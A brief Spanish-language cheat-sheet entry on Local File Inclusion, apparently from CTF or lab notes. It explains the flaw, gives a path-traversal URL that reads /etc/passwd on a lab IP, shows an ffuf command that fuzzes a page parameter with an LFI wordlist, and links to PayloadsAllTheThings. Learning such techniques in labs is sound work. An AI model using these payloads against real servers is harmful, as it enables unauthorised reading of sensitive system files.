# LFI

Es la vulnerabilidad que se encuentra principalmente en los servidores web.Seexplota cuando la entrada de un usuario contiene una determinada ruta al archivo que podría estar presente en el servidor y se incluirá en la salida. Este tipo de vulnerabilidad se puede utilizar para leer archivos que contienen datos sensibles y confidenciales del sistema vulnerable.

```
http://10.10.192.175/home?page=../../../../etc/passwd
```

- Fuzz LFI
ffuf -w /tools/wordlists/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -u http://dev.team.thm/script.php\?page\=/../FUZZ -t 100 -fw 1



Referencias
- [PayloadsAllTheThings LFi](https://github.com/cyberheartmi9/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal#basic-lfi-null-byte-double-encoding-and-other-tricks)